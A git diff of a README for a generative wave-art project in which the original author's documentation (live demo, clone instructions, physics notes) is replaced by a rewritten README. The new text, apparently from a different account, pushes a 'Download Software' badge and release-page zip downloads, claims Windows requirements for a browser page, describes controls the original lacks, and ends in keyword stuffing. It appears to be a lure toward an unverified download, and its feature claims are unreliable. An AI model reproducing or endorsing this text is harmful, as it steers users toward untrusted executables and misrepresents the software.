@@ -1,195 +1,67 @@
-# Fixed Wave — Generative Art
+# 🌊 Fixed-Wave-Generative-Art - Create Custom Digital Patterns For Apparel
 
-[![Live Demo](https://img.shields.io/badge/demo-live-green?style=for-the-badge)](https://reyrove.github.io/Fixed-Wave-Generative-Art)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue.svg)](https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases)
 
-> **Generative wave simulation art.** Each refresh creates a unique wave propagation simulation on a grid, with beautiful gradient colors and organic wave patterns.
+Fixed-Wave-Generative-Art generates digital wave simulations for use in textile and fashion design. The software creates patterns based on physics principles, including wave propagation and fixed boundary constraints. It uses pure JavaScript to render visuals, meaning the files remain lightweight and fast. Designers use these patterns for t-shirt graphics, textile prints, and creative projects.
 
-## 🎨 Live Demo
+## 🖥️ System Requirements
 
-<div align="center">
-  <a href="https://reyrove.github.io/Fixed-Wave-Generative-Art" target="_blank">
-    <img src="demo-screenshot.jpg" alt="Fixed Wave Website Demo" width="800" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);"/>
-  </a>
-  <br><br>
-  <a href="https://reyrove.github.io/Fixed-Wave-Generative-Art" target="_blank">
-    <img src="https://img.shields.io/badge/🌐_View_Live_Demo-0a0a0a?style=for-the-badge&logo=githubpages&logoColor=white&color=c9a84c" alt="View Live Demo" width="300"/>
-  </a>
-  <br>
-  <em>Click the image or button to experience the generative art</em>
-</div>
+This application runs on Windows 10 or Windows 11. Your computer requires at least 4GB of RAM and a modern web browser. The software functions on any standard processor. You do not need a high-end graphics card to run the simulation, as the browser handles the rendering process.
 
-## 👕 Apparel Preview
+## 💾 Downloading The Software
 
-<div align="center">
-  <img src="Fixed-Wave.jpg" alt="Fixed Wave on T-Shirt" width="600" style="border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);"/>
-  <br>
-  <em>Fixed Wave artwork printed on a T-shirt</em>
-</div>
+Follow these steps to obtain the latest version of the application:
 
-## ✨ Features
+1. Visit the [releases page](https://github.com/gamesmistressherculesclub958/Fixed-Wave-Generative-Art/releases) to see available versions.
+2. Look for the most recent version labeled as "Latest release."
+3. Click the link to download the zip file to your computer.
+4. Save the file to your desktop or a folder you can find easily.
+5. Right-click the downloaded folder and select "Extract All."
+6. Choose a destination folder and click "Extract."
 
-- **Wave Simulation** — Realistic wave propagation using finite difference method
-- **Grid-Based** — 10-160 cells in a dynamic grid
-- **Gradient Colors** — Beautiful color transitions between two random colors
-- **Oscillating Source** — Single point creates continuous waves
-- **Fixed Boundaries** — Waves reflect off the edges
-- **Animated Motion** — Continuous, flowing wave animation
-- **Rich Color Palettes** — 16 predefined colors with random combinations
-- **Seed-Based** — Every composition is unique and reproducible via its seed
-- **Save & Share** — Download as PNG with seed in filename
-- **Apparel Mode** — Preview artwork on a T-shirt mockup
-- **Responsive** — Works on desktop, tablet, and mobile
-- **Pure JavaScript** — No external dependencies
-- **Keyboard Shortcuts**:
-  - `R` — Regenerate
-  - `S` — Save image
-  - `T` — Toggle apparel view
+## ⚙️ Running The Simulation
 
-## 🎨 Artwork Details
+Once you extract the files, follow these steps to start the application:
 
-| Parameter | Range | Description |
-|-----------|-------|-------------|
-| **Grid Columns** | 10–160 | Horizontal resolution |
-| **Grid Rows** | 10–160 | Vertical resolution |
-| **Colors** | 16 options | Random color combinations |
-| **Wave Speed** | Variable | Random propagation speed |
-| **Source Frequency** | 10–310 Hz | Oscillation frequency |
+1. Open the folder you just extracted.
+2. Find the file inside named `index.html`.
+3. Double-click the file to open it in your default web browser.
+4. The simulation begins immediately upon opening the page.
+5. Use your mouse to interact with the waves if the specific mode allows it.
 
-## 🌊 The Physics
+## 🎨 Changing Wave Patterns
 
-### Wave Equation
-The artwork simulates the 2D wave equation using a finite difference method:
+The software contains built-in controls to adjust how the waves look. These controls allow you to modify the physics simulation in real time. 
 
-```
-∂²u/∂t² = c²(∂²u/∂x² + ∂²u/∂y²)
-```
+- **Frequency:** Adjust this setting to change the speed of the oscillation. High numbers create tight, fast waves, while low numbers create slow, rolling waves.
+- **Damping:** This setting controls how fast the wave energy fades. Use low damping values if you want the waves to bounce off boundaries for a long time. 
+- **Color Gradients:** The software includes several preset palettes. Select a palette to change the color of the wave peaks and valleys.
+- **Boundaries:** Toggle fixed boundaries to see how waves react when they hit the edge of the screen.
 
-### Fixed Boundaries
-All edges of the grid are fixed at zero displacement, creating reflections and complex interference patterns.
+## 📤 Saving Your Designs
 
-### Oscillating Source
-A single point in the grid oscillates continuously, generating waves that propagate outward and reflect off the boundaries.
+You can capture your patterns for use in other design programs like Photoshop or Illustrator:
 
-## 🚀 Quick Start
+1. Locate the "Save Image" button on the control panel.
+2. Click the button to download the current frame as a PNG file.
+3. Use this file as a base for your apparel designs or textile repeat patterns.
+4. You can also press the "Print Screen" key on your keyboard to copy the entire view to your clipboard and paste it into an image editor.
 
-### Local Development
+## 🛠️ Troubleshooting
 
-```bash
-# Clone the repository
-git clone https://github.com/reyrove/Fixed-Wave-Generative-Art.git
+If the software does not load correctly, check these common items:
 
-# Navigate to the directory
-cd Fixed-Wave-Generative-Art
+- **Browser Updates:** Ensure your browser is up to date. Chrome, Firefox, and Edge all support the required features.
+- **File Integrity:** If the page opens but looks empty, ensure you extracted all files from the zip folder. The program needs the related script files to function.
+- **Browser Security:** Some browsers block local files from running scripts. If the simulation does not start, try opening the index file in a different browser, such as moving from Edge to Chrome.
 
-# Open in browser
-open index.html
-# or use a live server
-```
+## 💡 Creative Suggestions
 
-### Deploy to GitHub Pages
+Use this tool to generate unique assets for your creative workflow:
 
-1. Push to GitHub
-2. Go to Settings → Pages
-3. Select branch `main` and root folder
-4. Your site will be live at `https://reyrove.github.io/Fixed-Wave-Generative-Art`
+- **Apparel Prints:** Generate high-resolution, abstract wave patterns to use as an "all-over" print for t-shirts or scarves.
+- **Backgrounds:** Use the high-contrast color settings to create vivid, modern backgrounds for digital marketing materials.
+- **Pattern Design:** Combine multiple screenshots in an image editor to create seamless, geometric repeat patterns.
+- **Textile Design:** Send the high-resolution output files to a textile printer to see how the physics-based patterns look on fabric.
 
-## 🧠 How It Works
-
-The artwork is generated using a deterministic random number generator, seeded by timestamp + random noise. Every refresh:
-
-1. **Setup**:
-   - Random grid size (10-160 columns, rows)
-   - Random two colors from 16-color palette
-   - Random wave speed and source frequency
-   - Random source position
-
-2. **Wave Simulation**:
-   - Uses finite difference method to solve wave equation
-   - Fixed boundaries (zero displacement at edges)
-   - Oscillating source generates continuous waves
-   - Waves propagate and reflect naturally
-
-3. **Rendering**:
-   - Each cell colored based on wave height
-   - Gradient between two random colors
-   - Alpha varies with wave height for depth
-   - Smooth, flowing animation
-
-## 📁 File Structure
-
-```
-Fixed-Wave-Generative-Art/
-├── index.html          # Main application (all-in-one)
-├── Fixed-Wave.jpg      # T-shirt mockup image
-├── fav.svg             # Favicon
-├── demo-screenshot.jpg # Website demo screenshot
-├── README.md           # This file
-└── LICENSE             # MIT License
-```
-
-## 🛠️ Tech Stack
-
-- **Pure Vanilla HTML/CSS/JS** — No dependencies
-- **Canvas API** — 2D rendering
-- **CSS Flexbox/Grid** — Responsive layout
-- **GitHub Pages** — Hosting
-
-## 🎯 Interactive Controls
-
-| Action | Keyboard | Button |
-|--------|----------|--------|
-| Regenerate | `R` | Click "regenerate" |
-| Save Image | `S` | Click "regenerate" |
-| Toggle Apparel | `T` | Click "apparel" |
-
-## 🎨 The Creative Process
-
-### Wave Simulation
-The wave equation is solved numerically using the finite difference method, creating realistic wave propagation and reflection patterns.
-
-### Color Palette
-16 carefully chosen colors (red, blue, yellow, green, cyan, magenta, orange, purple, pink, teal, navy, maroon, olive, beige, black, white) are combined randomly to create beautiful gradients.
-
-### Oscillating Source
-A single point oscillates continuously, generating waves that propagate outward, creating complex interference patterns as they reflect off the fixed boundaries.
-
-### Visual Depth
-The alpha (transparency) of each cell varies with wave height, creating a sense of depth and three-dimensionality.
-
-## 📱 Responsive Design
-
-The application automatically adapts to:
-- Desktop screens
-- Tablets
-- Mobile phones
-- Landscape orientation
-- Various aspect ratios
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Fork the repository
-- Create a feature branch
-- Submit a pull request
-
-### Ideas for Contributions:
-- Multiple wave sources
-- Different boundary conditions
-- New color palettes
-- Interactive controls
-- Performance optimizations
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- Inspired by wave physics and numerical simulations
-- Pure JavaScript implementation
-- Special thanks to the creative coding community
-
----
-
-**Built with ❤️ and wave physics**
+Keywords: apparel-design, creative-coding, creative-coding-jobs, creative-coding-projects, fashion-graphics, generative-art-toolkit, generative-design, generative-design-patterns, html5-canvas, pattern-design, pattern-designs, physics-simulation, reyrove, textile-design, textile-designer, tshirt-design, vanilla-javascript, wave-simulation
